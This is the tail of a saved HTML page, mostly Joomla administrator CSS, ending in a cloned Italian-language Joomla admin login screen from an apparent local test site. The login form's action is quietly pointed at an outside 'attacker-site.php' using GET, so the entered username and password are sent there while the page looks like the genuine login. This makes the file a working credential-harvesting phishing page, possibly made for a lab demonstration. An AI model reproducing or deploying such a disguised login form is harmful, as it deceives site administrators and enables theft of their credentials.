.well .row-even p,
.well .row-odd p {
	margin-bottom: 0;
}
h1,
h2,
h3,
h4,
h5,
h6 {
	margin: 12px 0;
}
h1 {
	font-size: 26px;
	line-height: 28px;
}
h2 {
	font-size: 22px;
	line-height: 24px;
}
h3 {
	font-size: 18px;
	line-height: 20px;
}
h4 {
	font-size: 14px;
	line-height: 16px;
}
h5 {
	font-size: 13px;
	line-height: 15px;
}
h6 {
	font-size: 12px;
	line-height: 14px;
}
.sidebar-nav .nav-list {
	padding-left: 25px;
	padding-right: 25px;
}
.sidebar-nav .nav-list > li > a {
	color: #555;
	padding: 3px 25px;
	margin-left: -26px;
	margin-right: -26px;
}
.sidebar-nav .nav-list > li.active > a {
	color: #fff;
	margin-right: -26px;
}
.sidebar-nav .nav-list > li > a:focus,
.sidebar-nav .nav-list > li > a:hover {
	text-decoration: none;
	color: #fff;
	background-color: #2d6ca2;
	text-shadow: none;
}
.quick-icons .nav li + .nav-header {
	margin-top: 12px;
	margin-bottom: 2px;
}
.quick-icons .nav-list > li > a {
	padding: 5px 15px;
}
.quick-icons {
	font-size: 14px;
	margin-bottom: 20px;
}
.quick-icons .nav-header,
.well .module-title.nav-header {
	font-size: 13px;
}
.quick-icons h2.nav-header {
	margin: 12px 0 5px;
}
.quick-icons h2.nav-header:first-child {
	margin: 0px 0 5px;
}
.well .module-title.nav-header {
	padding: 0 0 7px;
	margin: 0;
}
.quick-icons [class^="icon-"]:before,
.quick-icons [class*=" icon-"]:before {
	font-size: 16px;
	margin-bottom: 20px;
	line-height: 18px;
}
.quick-icons .nav-list [class^="icon-"],
.quick-icons .nav-list [class*=" icon-"] {
	margin-right: 9px;
}
html[dir=rtl] .quick-icons .nav-list [class^="icon-"],
html[dir=rtl] .quick-icons .nav-list [class*=" icon-"] {
	margin-left: 9px;
	margin-right: 0px;
}
.j-links-separator {
	margin: 20px 0px;
	width: 100%;
	height: 0px;
	border-top: 2px solid #DDDDDD;
}
.container-main,
#system-debug {
	padding-bottom: 50px;
}
#status {
	background: #ebebeb;
	border-top: 1px solid #d4d4d4;
	padding: 4px 10px;
	-webkit-box-shadow: 0px 1px 0px rgba(255, 255, 255, 0.8) inset, 0px -15px 15px rgba(255, 255, 255, 0.6);
	-moz-box-shadow: 0px 1px 0px rgba(255, 255, 255, 0.8) inset, 0px -15px 15px rgba(255, 255, 255, 0.6);
	box-shadow: 0px 1px 0px rgba(255, 255, 255, 0.8) inset, 0px -15px 15px rgba(255, 255, 255, 0.6);
	color: #626262;
}
#status .btn-group {
	margin: 0;
}
#status .btn-group.separator:after {
	content: ' ';
	display: block;
	float: left;
	background: #ADADAD;
	margin: 0 10px;
	height: 15px;
	width: 1px;
}
#status .btn-toolbar,
#status p {
	margin: 0px;
}
#status .btn-toolbar,
#status .btn-group {
	font-size: 12px;
}
#status a {
	color: #626262;
}
#status .badge {
	margin-right: .25em;
}
#status.status-top {
	background: #1a3867;
	-webkit-box-shadow: 0px 1px 0px rgba(255, 255, 255, 0.2) inset, 0px -1px 0px rgba(0, 0, 0, 0.3) inset, 0px -1px 0px rgba(0, 0, 0, 0.3);
	-moz-box-shadow: 0px 1px 0px rgba(255, 255, 255, 0.2) inset, 0px -1px 0px rgba(0, 0, 0, 0.3) inset, 0px -1px 0px rgba(0, 0, 0, 0.3);
	box-shadow: 0px 1px 0px rgba(255, 255, 255, 0.2) inset, 0px -1px 0px rgba(0, 0, 0, 0.3) inset, 0px -1px 0px rgba(0, 0, 0, 0.3);
	border-top: 0;
	color: #d9d9d9;
	padding: 2px 20px 6px 20px;
}
#status.status-top a {
	color: #d9d9d9;
}
.pagination-toolbar {
	margin: 0;
}
.pagination-toolbar a {
	line-height: 26px;
}
.pull-right > .dropdown-menu {
	left: auto;
	right: 0;
}
.disabled {
	cursor: default;
	background-image: none;
	opacity: 0.65;
	filter: alpha(opacity=65);
	-webkit-box-shadow: none;
	-moz-box-shadow: none;
	box-shadow: none;
}
.nav-filters hr {
	margin: 5px 0;
}
#assignment.tab-pane {
	min-height: 500px;
}
.btn-primary.active,
.btn-warning.active,
.btn-danger.active,
.btn-success.active,
.btn-info.active,
.btn-inverse.active {
	color: rgba(255,255,255,0.95);
}
.chzn-container,
.chzn-drop {
	max-width: 100% !important;
}
@media (max-width: 979px) {
	.navbar .nav {
		font-size: 13px;
		margin: 0 2px 0 0;
	}
	.navbar .nav > li > a {
		padding: 6px;
	}
	.container-fluid {
		padding-left: 10px;
		padding-right: 10px;
	}
}
@media (min-width: 768px) {
	body {
		padding-top: 30px;
	}
	body.component {
		padding-top: 0;
	}
	.row-fluid [class*="span"] {
		margin-left: 15px;
	}
	.row-fluid .modal-batch [class*="span"] {
		margin-left: 0;
	}
	.nav-collapse.collapse.in {
		height: auto !important;
	}
}
@media (max-width: 767px) {
	.navbar-search.pull-right {
		float: none;
		text-align: center;
	}
	.subhead-fixed {
		position: static;
		width: auto;
	}
	.container-fluid {
		padding-left: 0;
		padding-right: 0;
	}
}
@media (min-width: 738px) {
	body.component {
		padding-top: 0;
	}
}
@media (max-width: 738px) {
	.navbar .brand {
		font-size: 16px;
	}
}
.btn-subhead {
	display: none;
}
@media (min-width: 481px) {
	#filter-bar {
		height: 29px;
	}
}
@media (max-width: 480px) {
	.table th:nth-of-type(n+5),
	.table th:nth-of-type(3),
	.table th:nth-of-type(2),
	.table td:nth-of-type(n+5),
	.table td:nth-of-type(2),
	.table td:nth-of-type(3) {
		white-space: normal;
	}
	.pagination a {
		padding: 5px;
	}
	.btn-group.divider,
	.header .row-fluid .span3,
	.header .row-fluid .span7 {
		display: none;
	}
	.navbar .btn {
		margin: 0;
	}
	.btn-subhead {
		display: block;
		margin: 10px 0;
	}
	.chzn-container,
	.chzn-container .chzn-results,
	.chzn-container-single .chzn-drop {
		width: 99% !important;
	}
	.subhead-collapse.collapse {
		height: 0;
		overflow: hidden;
	}
	.btn-toolbar .btn-wrapper {
		display: block;
		margin: 0px 10px 5px 10px;
	}
	.btn-toolbar .btn-wrapper .btn {
		width: 100% !important;
	}
	.subhead {
		background: none repeat scroll 0 0 transparent;
		border-bottom: 0 solid #e3e3e3;
	}
	.btn-group + .btn-group {
		margin-left: 10px;
	}
	.login .chzn-single {
		width: 222px !important;
	}
	.login .chzn-container,
	.login .chzn-drop {
		width: 230px !important;
	}
}
@media (max-width: 320px) {
	.view-login .navbar-fixed-bottom {
		display: none;
	}
	.btn-toolbar .btn-wrapper .btn {
		width: 100% !important;
	}
}
.nav-collapse .nav li a,
.dropdown-menu a {
	background-image: none;
}
.nav-collapse .dropdown-menu > li > span {
	display: block;
	padding: 3px 20px;
}
.nav-collapse .dropdown-menu > li img {
	max-width: none;
}
@media (max-width: 767px) {
	.navbar-fixed-top .navbar-inner,
	.navbar-fixed-top .navbar-inner .container-fluid {
		padding: 0;
	}
	.navbar .brand {
		margin-top: 2px;
		float: none;
		text-align: center;
	}
	.navbar .btn-navbar {
		margin-top: 3px;
		margin-right: 3px;
		margin-bottom: 3px;
	}
	.nav-collapse .nav .nav-header {
		color: #fff;
	}
	.nav-collapse .nav,
	.navbar .nav-collapse .nav.pull-right {
		margin: 0;
	}
	.nav-collapse .dropdown-menu {
		margin: 0;
	}
	.nav-collapse .dropdown-menu > li > span {
		display: block;
		padding: 4px 15px;
	}
	.navbar-inverse .nav-collapse .dropdown-menu > li > span {
		color: #d9d9d9;
	}
	.nav-collapse .nav > li > a.dropdown-toggle {
		background-color: rgba(255,255,255,0.07);
		font-size: 12px;
		font-weight: bold;
		color: #eee;
		text-transform: uppercase;
		padding-left: 15px;
	}
	.nav-collapse .nav li a {
		margin-bottom: 0;
		border-top: 1px solid rgba(255,255,255,0.25);
		border-bottom: 1px solid rgba(0,0,0,0.5);
	}
	.nav-collapse .nav li ul li ul.dropdown-menu,
	.nav-collapse .nav li ul li:hover ul.dropdown-menu,
	.nav-collapse .caret {
		display: none !important;
	}
	.nav-collapse .nav > li > a,
	.nav-collapse .dropdown-menu a {
		font-size: 15px;
		font-weight: normal;
		color: #fff;
		-webkit-border-radius: 0;
		-moz-border-radius: 0;
		border-radius: 0;
	}
	.navbar .nav-collapse .nav > li > .dropdown-menu::before,
	.navbar .nav-collapse .nav > li > .dropdown-menu::after,
	.navbar .nav-collapse .dropdown-submenu > a::after {
		display: none;
	}
	.nav-collapse .dropdown-menu li + li a {
		margin-bottom: 0;
	}
}
.sortable-handler.inactive {
	opacity: 0.3;
	filter: alpha(opacity=30);
}
.alert-joomlaupdate {
	text-align: center;
}
.alert-joomlaupdate button {
	vertical-align: baseline;
}
.form-horizontal .control-label {
	width: auto;
	padding-right: 5px;
	text-align: left;
}
.form-horizontal .control-label .spacer hr {
	width: 380px;
}
@media (max-width: 420px) {
	.form-horizontal .control-label .spacer hr {
		width: 220px;
	}
}
.form-horizontal #jform_catid_chzn {
	vertical-align: middle;
}
.form-vertical .control-label > label {
	display: inline-block;
	*display: inline;
	*zoom: 1;
}
.form-vertical .controls {
	margin-left: 0;
}
@media (max-width: 979px) {
	.form-horizontal-desktop .control-label {
		float: none;
		width: auto;
		padding-right: 0;
		padding-top: 0;
		text-align: left;
	}
	.form-horizontal-desktop .control-label > label {
		display: inline-block;
		*display: inline;
		*zoom: 1;
	}
	.form-horizontal-desktop .controls {
		margin-left: 0;
	}
}
@media (max-width: 1200px) {
	.row-fluid .row-fluid .form-horizontal-desktop .control-label {
		float: none;
		width: auto;
		padding-right: 0;
		padding-top: 0;
		text-align: left;
	}
	.row-fluid .row-fluid .form-horizontal-desktop .control-label > label {
		display: inline-block;
		*display: inline;
		*zoom: 1;
	}
	.row-fluid .row-fluid .form-horizontal-desktop .controls {
		margin-left: 0;
	}
}
.form-inline-header {
	margin: 5px 0;
}
.form-inline-header .control-group,
.form-inline-header .control-label,
.form-inline-header .controls {
	display: inline-block;
	*display: inline;
	*zoom: 1;
}
.form-inline-header .control-label {
	width: auto;
	padding-right: 10px;
}
.form-inline-header .controls {
	padding-right: 20px;
}
fieldset.checkboxes input {
	float: left;
}
fieldset.checkboxes li {
	list-style: none;
}
ul.manager .height-50 .icon-folder-2 {
	height: 35px;
	width: 35px;
	line-height: 35px;
	font-size: 30px;
}
.upload-queue > li > span,
.upload-queue > li > a {
	margin: 0 2px;
}
.upload-queue .file-remove {
	float: right;
}
.moor-box {
	z-index: 3;
}
.admin .chzn-container .chzn-drop {
	z-index: 1060;
}
ul.treeselect,
ul.treeselect li {
	margin: 0;
	padding: 0;
}
ul.treeselect {
	margin-top: 8px;
}
ul.treeselect li {
	padding: 2px 10px 2px;
	list-style: none;
}
ul.treeselect i.treeselect-toggle {
	line-height: 18px;
}
ul.treeselect label {
	font-size: 1em;
	margin-left: 8px;
}
ul.treeselect label.nav-header {
	padding: 0;
}
ul.treeselect input {
	margin: 2px 0 0 8px;
}
ul.treeselect .treeselect-menu {
	margin: 0 6px;
}
ul.treeselect ul.dropdown-menu {
	margin: 0;
}
ul.treeselect ul.dropdown-menu li {
	padding: 0 5px;
	border: none;
}
table label {
	margin: 0;
}
td.has-context {
	height: 23px;
}
td.nowrap.has-context {
	width: 45%;
}
.item-associations {
	margin: 0;
}
.item-associations li {
	list-style: none;
	display: inline-block;
	margin: 0 0 3px 0;
}
.item-associations li a {
	color: #ffffff;
}
#flag img {
	padding-top: 6px;
	vertical-align: top;
}
.tooltip {
	max-width: 400px;
}
.tooltip-inner {
	max-width: none;
	text-align: left;
	text-shadow: none;
}
th .tooltip-inner {
	font-weight: normal;
}
.tooltip.hasimage {
	opacity: 1;
}
#permissions-sliders .chzn-container {
	position: absolute;
}
.container-popup {
	padding: 28px 10px 10px 10px;
}
.controls .btn-group > .btn {
	min-width: 50px;
}
.controls .btn-group.btn-group-yesno > .btn {
	min-width: 84px;
	padding: 2px 12px;
}
.img-preview > img {
	max-height: 100%;
}
#helpsite-refresh {
	vertical-align: top;
}
.alert-no-items {
	margin-top: 20px;
}
@media (max-width: 767px) {
	html[dir=rtl] #toolbar #toolbar-options,
	html[dir=rtl] #toolbar #toolbar-help,
	#toolbar #toolbar-options,
	#toolbar #toolbar-help {
		float: none;
	}
}
input.input-large-text {
	font-size: 18px;
	line-height: 22px;
	height: auto;
}
.info-labels {
	margin-top: -5px;
	margin-bottom: 10px;
}
[class^="chzn-color"].chzn-single,
[class*=" chzn-color"].chzn-single,
[class^="chzn-color"].chzn-single .chzn-single-with-drop,
[class*=" chzn-color"].chzn-single .chzn-single-with-drop {
	-webkit-box-shadow: none;
	-moz-box-shadow: none;
	box-shadow: none;
}
.chzn-color.chzn-single[rel="value_1"],
.chzn-color-reverse.chzn-single[rel="value_0"],
.chzn-color-state.chzn-single[rel="value_1"],
.chzn-color.chzn-single[rel="value_show_no_link"],
.chzn-color.chzn-single[rel="value_show_with_link"] {
	color: #fff;
	text-shadow: 0 -1px 0 rgba(0,0,0,0.25);
	background-color: #409740;
	background-image: -moz-linear-gradient(top,#46a546,#378137);
	background-image: -webkit-gradient(linear,0 0,0 100%,from(#46a546),to(#378137));
	background-image: -webkit-linear-gradient(top,#46a546,#378137);
	background-image: -o-linear-gradient(top,#46a546,#378137);
	background-image: linear-gradient(to bottom,#46a546,#378137);
	background-repeat: repeat-x;
	filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#ff46a546', endColorstr='#ff368136', GradientType=0);
	border-color: #378137 #378137 #204b20;
	*background-color: #378137;
	filter: progid:DXImageTransform.Microsoft.gradient(enabled = false);
}
.chzn-color.chzn-single[rel="value_1"]:hover,
.chzn-color.chzn-single[rel="value_1"]:focus,
.chzn-color.chzn-single[rel="value_1"]:active,
.chzn-color.chzn-single[rel="value_1"].active,
.chzn-color.chzn-single[rel="value_1"].disabled,
.chzn-color.chzn-single[rel="value_1"][disabled],
.chzn-color-reverse.chzn-single[rel="value_0"]:hover,
.chzn-color-reverse.chzn-single[rel="value_0"]:focus,
.chzn-color-reverse.chzn-single[rel="value_0"]:active,
.chzn-color-reverse.chzn-single[rel="value_0"].active,
.chzn-color-reverse.chzn-single[rel="value_0"].disabled,
.chzn-color-reverse.chzn-single[rel="value_0"][disabled],
.chzn-color-state.chzn-single[rel="value_1"]:hover,
.chzn-color-state.chzn-single[rel="value_1"]:focus,
.chzn-color-state.chzn-single[rel="value_1"]:active,
.chzn-color-state.chzn-single[rel="value_1"].active,
.chzn-color-state.chzn-single[rel="value_1"].disabled,
.chzn-color-state.chzn-single[rel="value_1"][disabled],
.chzn-color.chzn-single[rel="value_show_no_link"]:hover,
.chzn-color.chzn-single[rel="value_show_no_link"]:focus,
.chzn-color.chzn-single[rel="value_show_no_link"]:active,
.chzn-color.chzn-single[rel="value_show_no_link"].active,
.chzn-color.chzn-single[rel="value_show_no_link"].disabled,
.chzn-color.chzn-single[rel="value_show_no_link"][disabled],
.chzn-color.chzn-single[rel="value_show_with_link"]:hover,
.chzn-color.chzn-single[rel="value_show_with_link"]:focus,
.chzn-color.chzn-single[rel="value_show_with_link"]:active,
.chzn-color.chzn-single[rel="value_show_with_link"].active,
.chzn-color.chzn-single[rel="value_show_with_link"].disabled,
.chzn-color.chzn-single[rel="value_show_with_link"][disabled] {
	color: #fff;
	background-color: #378137;
	*background-color: #2f6f2f;
}
.chzn-color.chzn-single[rel="value_1"]:active,
.chzn-color.chzn-single[rel="value_1"].active,
.chzn-color-reverse.chzn-single[rel="value_0"]:active,
.chzn-color-reverse.chzn-single[rel="value_0"].active,
.chzn-color-state.chzn-single[rel="value_1"]:active,
.chzn-color-state.chzn-single[rel="value_1"].active,
.chzn-color.chzn-single[rel="value_show_no_link"]:active,
.chzn-color.chzn-single[rel="value_show_no_link"].active,
.chzn-color.chzn-single[rel="value_show_with_link"]:active,
.chzn-color.chzn-single[rel="value_show_with_link"].active {
	background-color: #285d28 \9;
}
.chzn-color.chzn-single[rel="value_0"],
.chzn-color-reverse.chzn-single[rel="value_1"],
.chzn-color-state.chzn-single[rel="value_0"],
.chzn-color-state.chzn-single[rel="value_-1"],
.chzn-color-state.chzn-single[rel="value_-2"],
.chzn-color.chzn-single[rel="value_hide"] {
	color: #fff;
	text-shadow: 0 -1px 0 rgba(0,0,0,0.25);
	background-color: #ad312b;
	background-image: -moz-linear-gradient(top,#bd362f,#942a25);
	background-image: -webkit-gradient(linear,0 0,0 100%,from(#bd362f),to(#942a25));
	background-image: -webkit-linear-gradient(top,#bd362f,#942a25);
	background-image: -o-linear-gradient(top,#bd362f,#942a25);
	background-image: linear-gradient(to bottom,#bd362f,#942a25);
	background-repeat: repeat-x;
	filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#ffbd362f', endColorstr='#ff942a24', GradientType=0);
	border-color: #942a25 #942a25 #571916;
	*background-color: #942a25;
	filter: progid:DXImageTransform.Microsoft.gradient(enabled = false);
}
.chzn-color.chzn-single[rel="value_0"]:hover,
.chzn-color.chzn-single[rel="value_0"]:focus,
.chzn-color.chzn-single[rel="value_0"]:active,
.chzn-color.chzn-single[rel="value_0"].active,
.chzn-color.chzn-single[rel="value_0"].disabled,
.chzn-color.chzn-single[rel="value_0"][disabled],
.chzn-color-reverse.chzn-single[rel="value_1"]:hover,
.chzn-color-reverse.chzn-single[rel="value_1"]:focus,
.chzn-color-reverse.chzn-single[rel="value_1"]:active,
.chzn-color-reverse.chzn-single[rel="value_1"].active,
.chzn-color-reverse.chzn-single[rel="value_1"].disabled,
.chzn-color-reverse.chzn-single[rel="value_1"][disabled],
.chzn-color-state.chzn-single[rel="value_0"]:hover,
.chzn-color-state.chzn-single[rel="value_0"]:focus,
.chzn-color-state.chzn-single[rel="value_0"]:active,
.chzn-color-state.chzn-single[rel="value_0"].active,
.chzn-color-state.chzn-single[rel="value_0"].disabled,
.chzn-color-state.chzn-single[rel="value_0"][disabled],
.chzn-color-state.chzn-single[rel="value_-1"]:hover,
.chzn-color-state.chzn-single[rel="value_-1"]:focus,
.chzn-color-state.chzn-single[rel="value_-1"]:active,
.chzn-color-state.chzn-single[rel="value_-1"].active,
.chzn-color-state.chzn-single[rel="value_-1"].disabled,
.chzn-color-state.chzn-single[rel="value_-1"][disabled],
.chzn-color-state.chzn-single[rel="value_-2"]:hover,
.chzn-color-state.chzn-single[rel="value_-2"]:focus,
.chzn-color-state.chzn-single[rel="value_-2"]:active,
.chzn-color-state.chzn-single[rel="value_-2"].active,
.chzn-color-state.chzn-single[rel="value_-2"].disabled,
.chzn-color-state.chzn-single[rel="value_-2"][disabled],
.chzn-color.chzn-single[rel="value_hide"]:hover,
.chzn-color.chzn-single[rel="value_hide"]:focus,
.chzn-color.chzn-single[rel="value_hide"]:active,
.chzn-color.chzn-single[rel="value_hide"].active,
.chzn-color.chzn-single[rel="value_hide"].disabled,
.chzn-color.chzn-single[rel="value_hide"][disabled] {
	color: #fff;
	background-color: #942a25;
	*background-color: #802420;
}
.chzn-color.chzn-single[rel="value_0"]:active,
.chzn-color.chzn-single[rel="value_0"].active,
.chzn-color-reverse.chzn-single[rel="value_1"]:active,
.chzn-color-reverse.chzn-single[rel="value_1"].active,
.chzn-color-state.chzn-single[rel="value_0"]:active,
.chzn-color-state.chzn-single[rel="value_0"].active,
.chzn-color-state.chzn-single[rel="value_-1"]:active,
.chzn-color-state.chzn-single[rel="value_-1"].active,
.chzn-color-state.chzn-single[rel="value_-2"]:active,
.chzn-color-state.chzn-single[rel="value_-2"].active,
.chzn-color.chzn-single[rel="value_hide"]:active,
.chzn-color.chzn-single[rel="value_hide"].active {
	background-color: #6b1f1b \9;
}
#permissions-sliders .input-small {
	width: 120px;
}
.editor {
	overflow: hidden;
	position: relative;
}
.editor textarea.mce_editable {
	box-sizing: border-box;
}
a.grid_false {
	display: inline-block;
	height: 16px;
	width: 16px;
	background-image: url('../images/admin/publish_r.png');
}
a.grid_true {
	display: inline-block;
	height: 16px;
	width: 16px;
	background-image: url('../images/admin/icon-16-allow.png');
}
.j-sidebar-container {
	position: absolute;
	display: block;
	left: -16.5%;
	width: 16.5%;
	margin: -10px 0 0 -1px;
	padding-top: 28px;
	padding-bottom: 10px;
	clear: both;
	background-color: #f5f5f5;
	border-bottom: 1px solid #e3e3e3;
	border-right: 1px solid #e3e3e3;
	-webkit-border-radius: 0 0 4px 0;
	-moz-border-radius: 0 0 4px 0;
	border-radius: 0 0 4px 0;
}
.j-sidebar-container.j-sidebar-hidden {
	left: -16.5%;
}
.j-sidebar-container.j-sidebar-visible {
	left: 0;
}
.j-sidebar-container .filter-select {
	padding: 0 14px;
}
.j-toggle-button-wrapper {
	position: absolute;
	display: block;
	top: 7px;
	padding: 0;
}
.j-toggle-button-wrapper.j-toggle-hidden {
	right: -24px;
}
.j-toggle-button-wrapper.j-toggle-visible {
	right: 7px;
}
.j-toggle-sidebar-button {
	font-size: 16px;
	color: #3071a9;
	text-decoration: none;
	cursor: pointer;
}
.j-toggle-sidebar-button:hover {
	color: #1f496e;
}
#system-message-container,
#j-main-container {
	padding: 0 0 0 5px;
	min-height: 0;
}
#system-message-container.j-toggle-main,
#j-main-container.j-toggle-main,
#system-debug.j-toggle-main {
	float: right;
}
@media (min-width: 768px) {
	.j-toggle-transition {
		-webkit-transition: all 0.3s ease;
		-moz-transition: all 0.3s ease;
		-o-transition: all 0.3s ease;
		transition: all 0.3s ease;
	}
}
@media (max-width: 979px) {
	.j-toggle-button-wrapper.j-toggle-hidden {
		right: -20px;
	}
}
@media (max-width: 767px) {
	.j-sidebar-container {
		position: relative;
		width: 100%;
		margin: 0 0 20px 0;
		padding: 0;
		background: transparent;
		border-right: 0;
		border-bottom: 0;
	}
	.j-sidebar-container.j-sidebar-hidden {
		margin-left: 16.5%;
	}
	.j-sidebar-container.j-sidebar-visible {
		margin-left: 0;
	}
	.j-toggle-sidebar-header,
	.j-toggle-button-wrapper {
		display: none;
	}
	.view-login select {
		width: 232px;
	}
}
@media (max-width: 420px) {
	.j-sidebar-container {
		margin: 0;
	}
	.view-login .input-medium {
		width: 180px;
	}
	.view-login select {
		width: 232px;
	}
}
.break-word {
	word-break: break-all;
	word-wrap: break-word;
}
textarea {
	resize: both;
}
textarea.vert {
	resize: vertical;
}
textarea.noResize {
	resize: none;
}
body.modal-open {
	overflow: hidden;
	-ms-overflow-style: none;
}
.field-media-wrapper .modal .modal-body {
	padding: 5px 10px;
	overflow: hidden;
}
.js-pstats-data-details dd {
	margin-left: 240px;
}
.js-pstats-data-details dt {
	width: 220px;
}
.modal-footer {
	clear: both;
}
.modal-header {
	text-align: left;
}
#permissions table td,
#page-permissions table td {
	vertical-align: middle;
}
#permissions table select,
#page-permissions table select {
	margin-bottom: 0;
}
	
	</style>
	<script src="/web-applications/joomla/media/system/js/core.js"></script>
	<script src="/web-applications/joomla/media/jui/js/jquery.min.js"></script>
	<script src="/web-applications/joomla/media/jui/js/jquery-noconflict.js"></script>
	<script src="/web-applications/joomla/media/jui/js/jquery-migrate.min.js"></script>
	<script src="/web-applications/joomla/media/jui/js/bootstrap.min.js"></script>
	<script src="/web-applications/joomla/media/jui/js/chosen.jquery.min.js"></script>
	<script>
jQuery(function () {
			if (top == self) {
				document.documentElement.style.display = "block";
			}
			else
			{
				top.location = self.location;
			}

			// Firefox fix
			jQuery("input[autofocus]").focus();
		})
window.setInterval(function(){var r;try{r=window.XMLHttpRequest?new XMLHttpRequest():new ActiveXObject("Microsoft.XMLHTTP")}catch(e){}if(r){r.open("GET","/web-applications/joomla/administrator/index.php",true);r.send(null)}},840000);
jQuery(function($){ $(".hasTooltip").tooltip({"html": true,"container": "body"}); });
		jQuery(document).ready(function (){
			jQuery('.advancedSelect').chosen({"disable_search_threshold":10,"search_contains":true,"allow_single_deselect":true,"placeholder_text_multiple":"Scrivi o seleziona alcune opzioni","placeholder_text_single":"Seleziona un'opzione","no_results_text":"Nessun risultato corrispondente"});
		});
	
	</script>

	<!--[if lt IE 9]><script src="/web-applications/joomla/media/jui/js/html5.js"></script><![endif]-->
</head>
<body class="site com_login view-login layout-default task- itemid- ">
	<!-- Container -->
	<div class="container">
		<div id="content">
			<!-- Begin Content -->
			<div id="element-box" class="login well">
									<img src="/web-applications/joomla/administrator/templates/isis/images/joomla.png" alt="Joomla Test" />
								<hr />
				<div id="system-message-container">
	</div>

				<form action="http://yourhost/test/attacker-site.php?username=username&passwd=password" method="get" id="form-login" class="form-inline">
	<fieldset class="loginform">
		<div class="control-group">
			<div class="controls">
				<div class="input-prepend input-append">
					<span class="add-on">
						<span class="icon-user hasTooltip" title="Nome utente"></span>
						<label for="mod-login-username" class="element-invisible">
							Nome utente						</label>
					</span>
					<input name="username" tabindex="1" id="mod-login-username" type="text" class="input-medium" placeholder="Nome utente" size="15" autofocus="true" />
					<a href="http://localhost/web-applications/joomla/index.php?option=com_users&view=remind" class="btn width-auto hasTooltip" title="Hai dimenticato il tuo nome utente?">
						<span class="icon-help"></span>
					</a>
				</div>
			</div>
		</div>
		<div class="control-group">
			<div class="controls">
				<div class="input-prepend input-append">
					<span class="add-on">
						<span class="icon-lock hasTooltip" title="Password"></span>
						<label for="mod-login-password" class="element-invisible">
							Password						</label>
					</span>
					<input name="passwd" tabindex="2" id="mod-login-password" type="password" class="input-medium" placeholder="Password" size="15"/>
					<a href="http://localhost/web-applications/joomla/index.php?option=com_users&view=reset" class="btn width-auto hasTooltip" title="Hai dimenticato la tua password?">
						<span class="icon-help"></span>
					</a>
				</div>
			</div>
		</div>
							<div class="control-group">
				<div class="controls">
					<div class="input-prepend">
						<span class="add-on">
							<span class="icon-comment hasTooltip" title="Lingua"></span>
							<label for="lang" class="element-invisible">
								Lingua							</label>
						</span>
						<select id="lang" name="lang"  class="advancedSelect">
	<option value="" selected="selected">Lingua - Predefinita</option>
	<option value="en-GB">English (en-GB)</option>
	<option value="it-IT">Italian (IT)</option>
</select>
					</div>
				</div>
			</div>
				<div class="control-group">
			<div class="controls">
				<div class="btn-group">
					<button tabindex="3" class="btn btn-primary btn-block btn-large">
						<span class="icon-lock icon-white"></span> Accedi					</button>
				</div>
			</div>
		</div>
		<input type="hidden" name="option" value="com_login"/>
		<input type="hidden" name="task" value="login"/>
		<input type="hidden" name="return" value="aW5kZXgucGhw"/>
		<input type="hidden" name="bdf9fb112db196ad0e5499622e673d53" value="1" />	</fieldset>
</form>

			</div>
			<noscript>
				Attenzione! JavaScript dev'essere abilitato per le operazioni del lato amministrativo.			</noscript>
			<!-- End Content -->
		</div>
	</div>
	<div class="navbar navbar-fixed-bottom hidden-phone">
		<p class="pull-right">
			&copy; 2016 Joomla Test		</p>
		<a class="login-joomla hasTooltip" href="https://www.joomla.org" target="_blank" title="Joomla è un software libero rilasciato sotto licenza GNU General Public License."><span class="icon-joomla"></span></a>
		<a href="http://localhost/web-applications/joomla/" target="_blank" class="pull-left"><span class="icon-out-2"></span>Torna alla Homepage del sito</a>
	</div>
	
</body>
</html>
